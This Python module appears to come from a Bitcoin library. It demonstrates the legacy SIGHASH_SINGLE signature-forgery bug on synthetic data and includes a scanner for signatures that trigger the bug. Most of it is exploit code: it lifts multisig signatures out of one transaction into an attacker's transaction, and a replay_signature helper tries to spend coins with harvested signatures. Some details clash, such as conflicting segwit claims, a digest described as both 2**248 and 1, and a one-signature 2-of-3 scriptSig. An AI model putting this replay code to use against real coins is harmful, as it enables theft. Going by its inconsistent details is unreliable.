"""The SIGHASH_SINGLE bug: a real signature-forgery condition in Bitcoin.

With ``SIGHASH_SINGLE`` a signature commits to the input at index ``i`` and the
output at index ``i``.  When the transaction has no output at index ``i``,
Bitcoin's historical bug makes ``SignatureHash`` return the constant
``uint256::ONE`` — the 32 bytes ``01 00 ... 00``, i.e. the number ``2**248`` —
instead of a hash of the transaction.

A signature over that digest is therefore valid for **every** transaction
that places that input at an index with no matching output — the signature no
longer commits to any amount, destination or other input.  Anyone holding such
a signature (from an abandoned transaction, a buggy wallet, a signing service)
can spend the coin anywhere.  This is the flaw behind the 2018-2019
BitPay/Copay multi-signature losses.

This module demonstrates it end to end on regtest-style data: build a
transaction that triggers the bug condition, show the digest really is ``1``,
then reuse the very same signature in an attacker's transaction that pays a
different address, and show the contrast with ``SIGHASH_ALL``.

Nothing here is exploitable against a wallet that signs ``SIGHASH_ALL``, and
segwit v0 (BIP143) removed the constant-digest behaviour entirely: a missing
matching output simply means a zero ``hashOutputs``, so the signature still
commits to the transaction.
"""

from dataclasses import dataclass, field
from typing import List, Optional, Sequence, Tuple

from .curve import N
from .encoding import encode_varint, hash160, push_data, script_to_address
from .signing import (
    HASH_ONE,
    SIGHASH_ALL,
    SIGHASH_SINGLE,
    SIGHASH_SINGLE_BUG_DIGEST,
    SignatureInfo,
    Transaction,
    TxIn,
    TxOut,
    decode_point,
    der_decode,
    der_encode,
    private_key_to_public_key,
    sign_z,
    verify_z,
)
from .encoding import b58encode_check, network_params


# ---------------------------------------------------------------------------
# Multisig scripts
# ---------------------------------------------------------------------------


def multisig_redeem_script(m: int, pubkeys: Sequence[bytes]) -> bytes:
    """``OP_m <pubkey>... OP_n OP_CHECKMULTISIG``, keys sorted for determinism."""
    n = len(pubkeys)
    if not 1 <= m <= n <= 15:
        raise ValueError('need 1 <= m <= n <= 15 for a bare multisig script')
    body = b'' + bytes([0x50 + m])
    for pubkey in pubkeys:
        decode_point(pubkey)  # validates the encoding
        body += push_data(pubkey)
    return body + bytes([0x50 + n]) + b'\xae'


def p2sh_script(redeem_script: bytes) -> bytes:
    return b'\xa9' + push_data(hash160(redeem_script)) + b'\x87'


def parse_multisig_redeem_script(script: bytes) -> Tuple[int, int, List[bytes]]:
    """Decode ``OP_m <pubkeys> OP_n OP_CHECKMULTISIG`` -> ``(m, n, pubkeys)``."""
    if len(script) < 3 or script[-1] != 0xAE:
        raise ValueError('not a multisig script (missing OP_CHECKMULTISIG)')
    m = script[0] - 0x50
    if not 1 <= m <= 15:
        raise ValueError('invalid OP_m')
    offset = 1
    pubkeys: List[bytes] = []
    while offset < len(script) - 2:
        length = script[offset]
        if not 33 <= length <= 65:
            raise ValueError('invalid public key length %d' % length)
        pubkeys.append(script[offset + 1:offset + 1 + length])
        offset += 1 + length
    n = script[offset] - 0x50
    if n != len(pubkeys):
        raise ValueError('OP_n (%d) does not match %d public keys' % (n, len(pubkeys)))
    return m, n, pubkeys


def multisig_script_sig(signatures: Sequence[Tuple[int, int, int]], redeem_script: bytes) -> bytes:
    """``OP_0 <sig>... <redeemScript>`` as ``OP_CHECKMULTISIG`` expects."""
    out = b'\x00'
    for r, s, sighash_type in signatures:
        out += push_data(der_encode(r, s, sighash_type))
    return out + push_data(redeem_script)


def parse_script_sig(script: bytes) -> List[Optional[bytes]]:
    """Decode push operations (``None`` for a bare ``OP_0``)."""
    items: List[Optional[bytes]] = []
    offset = 0
    while offset < len(script):
        op = script[offset]
        if op == 0x00:
            items.append(None)
            offset += 1
            continue
        if op < 0x4C:
            items.append(script[offset + 1:offset + 1 + op])
            offset += 1 + op
            continue
        if op == 0x4C:
            size = script[offset + 1]
            items.append(script[offset + 2:offset + 2 + size])
            offset += 2 + size
            continue
        if op == 0x4D:
            size = int.from_bytes(script[offset + 1:offset + 3], 'little')
            items.append(script[offset + 3:offset + 3 + size])
            offset += 3 + size
            continue
        raise ValueError('unsupported opcode 0x%02x in script' % op)
    return items


# ---------------------------------------------------------------------------
# The demonstration
# ---------------------------------------------------------------------------


@dataclass
class MultisigWallet:
    """A 2-of-3 P2SH multisig "wallet" to attack."""

    m: int
    pubkeys: List[bytes]
    redeem_script: bytes

    @classmethod
    def create(cls, private_keys: Sequence[int], m: int = 2) -> 'MultisigWallet':
        pubkeys = sorted(private_key_to_public_key(k) for k in private_keys)
        return cls(m=m, pubkeys=pubkeys, redeem_script=multisig_redeem_script(m, pubkeys))

    @property
    def script_pubkey(self) -> bytes:
        return p2sh_script(self.redeem_script)

    def address(self, network: str = 'mainnet') -> Optional[str]:
        p2sh_version = network_params(network)[1]
        return b58encode_check(bytes([p2sh_version]) + hash160(self.redeem_script))


@dataclass
class BugDemo:
    """Result of :func:`demonstrate_sighash_single_bug`."""

    victim_tx: Transaction
    victim_digests: List[int]
    victim_signatures: List[Tuple[int, int]]
    attacker_tx: Transaction
    attacker_script_sig: bytes
    attacker_verifications: List[bool]
    all_sighash_contrast: bool
    wallet: MultisigWallet
    destination: str = ''
    victim_txid: str = ''
    attacker_txid: str = ''

    def report(self) -> str:
        lines = [
            'SIGHASH_SINGLE bug demonstration',
            '=' * 32,
            '',
            'wallet (2-of-3 P2SH multisig)',
            '  redeemScript: %s' % self.wallet.redeem_script.hex(),
            '  address:      %s' % self.wallet.address(),
            '',
            'step 1 - a transaction where input 1 has no matching output',
            '  txid: %s' % self.victim_txid,
            '  inputs: %d, outputs: %d' % (len(self.victim_tx.inputs), len(self.victim_tx.outputs)),
            '  digest for input 0 (SIGHASH_ALL):    %064x' % self.victim_digests[0],
            '  digest for input 1 (SIGHASH_SINGLE): %s'
            % ('uint256::ONE (01 00 ... 00)' if self.victim_digests[1] == SIGHASH_SINGLE_BUG_DIGEST else '%064x' % self.victim_digests[1]),
        ]
        if self.victim_digests[1] == SIGHASH_SINGLE_BUG_DIGEST:
            lines.append('  -> the bug: the digest is the constant uint256::ONE, not a hash')
        for i, (r, s) in enumerate(self.victim_signatures):
            lines.append('  signature %d over uint256::ONE: r=%d s=%d' % (i, r, s))
        lines += [
            '',
            'step 2 - a *different* transaction, built by someone else',
            '  txid: %s' % self.attacker_txid,
            '  destination: %s' % self.destination,
            '  inputs: %d, outputs: %d' % (len(self.attacker_tx.inputs), len(self.attacker_tx.outputs)),
            '  scriptSig: %s' % self.attacker_script_sig.hex(),
            '',
            'step 3 - verification',
        ]
        for i, ok in enumerate(self.attacker_verifications):
            lines.append('  signature %d valid in the attacker tx: %s' % (i, ok))
        lines.append(
            '  same signature with SIGHASH_ALL valid in the attacker tx: %s'
            % self.all_sighash_contrast
        )
        lines += [
            '',
            'Conclusion: a SIGHASH_SINGLE signature for an input with no matching',
            'output commits to nothing, so it authorises spending that coin in any',
            'transaction. SIGHASH_ALL (and every segwit sighash) commits to the whole',
            'transaction and cannot be reused this way.',
        ]
        return '\n'.join(lines)


def demonstrate_sighash_single_bug(
    wallet: Optional[MultisigWallet] = None,
    private_keys: Optional[Sequence[int]] = None,
    victim_prev_txid: str = '11' * 32,
    attacker_prev_txid: str = '22' * 32,
    attacker_value: int = 100000,
    victim_value: int = 500000,
    fee: int = 1000,
    destination: str = '',
    network: str = 'mainnet',
) -> BugDemo:
    """Run the whole demonstration, offline, on synthetic outpoints.

    The two signing keys below are the wallet's own keys: the point is not that
    the attack needs them, but that the *signature it produces can be lifted out
    of one transaction and replayed in another*, which is what makes the flaw
    dangerous.
    """
    if private_keys is None and wallet is None:
        # Harmless demo keys: the demonstration is offline and these coins do
        # not exist. Any three distinct scalars will do.
        private_keys = [0xC0FFEE01, 0xC0FFEE02, 0xC0FFEE03]
    if wallet is None:
        wallet = MultisigWallet.create(private_keys, m=2)
    if not private_keys:
        raise ValueError(
            'the demonstration signs with the wallet keys, so private_keys is required'
        )

    script_pubkey = wallet.script_pubkey
    if not destination:
        destination = demo_destination(network)

    # --- step 1: the victim transaction -----------------------------------
    # Input 0 is an ordinary input (SIGHASH_ALL); input 1 is the multisig coin
    # signed with SIGHASH_SINGLE, and the transaction has a single output, so
    # input 1 has no matching output -> digest bug.
    victim = Transaction(
        version=2,
        inputs=[
            TxIn(victim_prev_txid, 0, 0xFFFFFFFF),
            TxIn(victim_prev_txid, 1, 0xFFFFFFFF),
        ],
        outputs=[TxOut(victim_value - fee, script_pubkey)],
        locktime=0,
    )
    digest_all = victim.sighash_legacy(0, script_pubkey, SIGHASH_ALL)
    digest_single = victim.sighash_legacy(1, script_pubkey, SIGHASH_SINGLE)

    # Each signature stays bound to the key that produced it: the pubkeys in
    # the redeem script are sorted, so zipping by position would be wrong.
    signing_keys = list(private_keys)[: wallet.m]
    made = []
    for key in signing_keys:
        r, s = sign_z(key, digest_single)
        made.append((r, s, private_key_to_public_key(key)))
    signatures = [(r, s) for r, s, _ in made]
    signing_pubkeys = [pub for _, _, pub in made]

    victim_signatures = list(signatures)
    victim_script_sig = multisig_script_sig(
        [(r, s, SIGHASH_SINGLE) for r, s in signatures], wallet.redeem_script
    )
    victim_inputs = [
        victim.inputs[0],
        TxIn(victim_prev_txid, 1, 0xFFFFFFFF, script_sig=victim_script_sig),
    ]
    victim = Transaction(victim.version, victim_inputs, victim.outputs, victim.locktime)

    # --- step 2: the attacker's transaction -------------------------------
    # Same coin, different destination, different amounts, an extra decoy
    # input. The only requirement is that the target input's index (1) has no
    # matching output, i.e. fewer than two outputs.
    attacker = Transaction(
        version=2,
        inputs=[
            TxIn(attacker_prev_txid, 0, 0xFFFFFFFF),
            TxIn(victim_prev_txid, 1, 0xFFFFFFFF),
        ],
        outputs=[TxOut(attacker_value - fee, _attacker_script(destination, network))],
        locktime=0,
    )
    attacker_signature_over_one = [(r, s) for r, s in signatures]
    attacker_script_sig = multisig_script_sig(
        [(r, s, SIGHASH_SINGLE) for r, s in attacker_signature_over_one],
        wallet.redeem_script,
    )
    attacker = Transaction(
        attacker.version,
        [attacker.inputs[0], TxIn(victim_prev_txid, 1, 0xFFFFFFFF, script_sig=attacker_script_sig)],
        attacker.outputs,
        attacker.locktime,
    )

    # --- step 3: verification --------------------------------------------
    verifications = []
    for (r, s), pubkey in zip(attacker_signature_over_one, signing_pubkeys):
        # The attacker tx's own digest for input 1 is also 1, which is why the
        # old signature still verifies.
        attacker_digest = attacker.sighash_legacy(1, script_pubkey, SIGHASH_SINGLE)
        verifications.append(
            attacker_digest == SIGHASH_SINGLE_BUG_DIGEST
            and verify_z(decode_point(pubkey), r, s, attacker_digest)
        )

    # Contrast: a SIGHASH_ALL signature does not transfer between transactions.
    key = signing_keys[0]
    r_all, s_all = sign_z(key, digest_all)
    attacker_all_digest = attacker.sighash_legacy(0, script_pubkey, SIGHASH_ALL)
    contrast = verify_z(
        decode_point(private_key_to_public_key(key)), r_all, s_all, attacker_all_digest
    )

    return BugDemo(
        victim_tx=victim,
        victim_digests=[digest_all, digest_single],
        victim_signatures=victim_signatures,
        attacker_tx=attacker,
        attacker_script_sig=attacker_script_sig,
        attacker_verifications=verifications,
        all_sighash_contrast=bool(contrast),
        wallet=wallet,
        destination=destination,
        victim_txid=victim.txid(),
        attacker_txid=attacker.txid(),
    )


#: Throwaway key used only to label the "attacker" payout address in the demo.
ATTACKER_DEMO_KEY = 0xDEADBEEF


def demo_destination(network: str = 'mainnet') -> str:
    """A clearly-not-the-wallet payout address, for the demonstration."""
    from .encoding import p2pkh_address

    return p2pkh_address(private_key_to_public_key(ATTACKER_DEMO_KEY), network)


def _attacker_script(destination: str, network: str) -> bytes:
    """scriptPubKey for the attacker's payout address."""
    from .wallet import address_to_script

    if not destination:
        raise ValueError('an attacker destination address is required')
    return address_to_script(destination, network)


# ---------------------------------------------------------------------------
# Analysing a real transaction for the bug condition
# ---------------------------------------------------------------------------


@dataclass
class SighashSingleFinding:
    input_index: int
    sighash_type: int
    digest: int
    bug_triggered: bool
    signature_hex: str


def analyse_sighash_single(
    tx: Transaction,
    prevouts: Optional[Sequence[bytes]] = None,
) -> List[SighashSingleFinding]:
    """Find signatures using SIGHASH_SINGLE and say whether the bug triggers.

    ``prevouts[i]`` is the scriptPubKey being spent by input ``i`` (used as the
    scriptCode for legacy digests).  Witness signatures are inspected too; for
    segwit v0 the bug also yields the constant digest ``1``.
    """
    findings: List[SighashSingleFinding] = []
    for index, txin in enumerate(tx.inputs):
        blobs = list(txin.witness)
        try:
            blobs += [item for item in parse_script_sig(txin.script_sig) if item]
        except ValueError:
            blobs = list(txin.witness)

        script_code = prevouts[index] if prevouts and index < len(prevouts) else b''
        for blob in blobs:
            try:
                r, s, sighash_type = der_decode(blob)
            except ValueError:
                continue
            if sighash_type is None or sighash_type & 0x1F != SIGHASH_SINGLE:
                continue
            if txin.witness and script_code:
                from .signing import p2pkh_script_code

                digest = tx.sighash_segwit_v0(index, script_code, 0, sighash_type)
            else:
                digest = tx.sighash_legacy(index, script_code, sighash_type)
            findings.append(
                SighashSingleFinding(
                    input_index=index,
                    sighash_type=sighash_type,
                    digest=digest,
                    bug_triggered=digest == SIGHASH_SINGLE_BUG_DIGEST,
                    signature_hex=blob.hex(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# Reusing a signature found in an existing transaction
# ---------------------------------------------------------------------------


@dataclass
class ReplayResult:
    """Outcome of trying to replay a signature into a new transaction."""

    digest_used: int
    signature: Tuple[int, int]
    valid: bool
    script_sig: bytes
    transaction: Transaction

    def report(self) -> str:
        return (
            'digest in the new transaction: %d\n'
            'signature: r=%d s=%d\n'
            'reassembled scriptSig: %s\n'
            'valid: %s\n'
            'txid: %s'
            % (
                self.digest_used,
                self.signature[0],
                self.signature[1],
                self.script_sig.hex(),
                'yes - the coin can be spent by anyone holding this signature'
                if self.valid
                else 'no',
                self.transaction.txid(),
            )
        )


def replay_signature(
    signature: Tuple[int, int],
    sighash_type: int,
    target_txid: str,
    target_vout: int,
    redeem_script: bytes,
    destination_script: bytes,
    value: int,
    public_key: bytes,
    extra_input_txid: Optional[str] = None,
    value_in: Optional[int] = None,
) -> ReplayResult:
    """Try to spend a coin using a signature harvested from another transaction.

    The new transaction keeps the target input at index 1 with a single output,
    reproducing the condition under which ``SIGHASH_SINGLE`` yields digest 1.
    For ``SIGHASH_ALL``/``NONE`` the digest changes and verification fails,
    which is the point of the comparison.
    """
    if extra_input_txid is None:
        extra_input_txid = '33' * 32
    target = TxIn(target_txid, target_vout, 0xFFFFFFFF)
    tx = Transaction(
        version=2,
        inputs=[TxIn(extra_input_txid, 0, 0xFFFFFFFF), target],
        outputs=[TxOut(value, destination_script)],
        locktime=0,
    )
    digest = tx.sighash_legacy(1, p2sh_script(redeem_script), sighash_type)
    r, s = signature
    valid = verify_z(decode_point(public_key), r, s, digest)

    if valid:
        script_sig = multisig_script_sig([(r, s, sighash_type)], redeem_script)
    else:
        script_sig = b''
    signed = Transaction(
        tx.version,
        [tx.inputs[0], TxIn(target_txid, target_vout, 0xFFFFFFFF, script_sig=script_sig)],
        tx.outputs,
        tx.locktime,
    )
    return ReplayResult(
        digest_used=digest, signature=signature, valid=valid, script_sig=script_sig, transaction=signed
    )
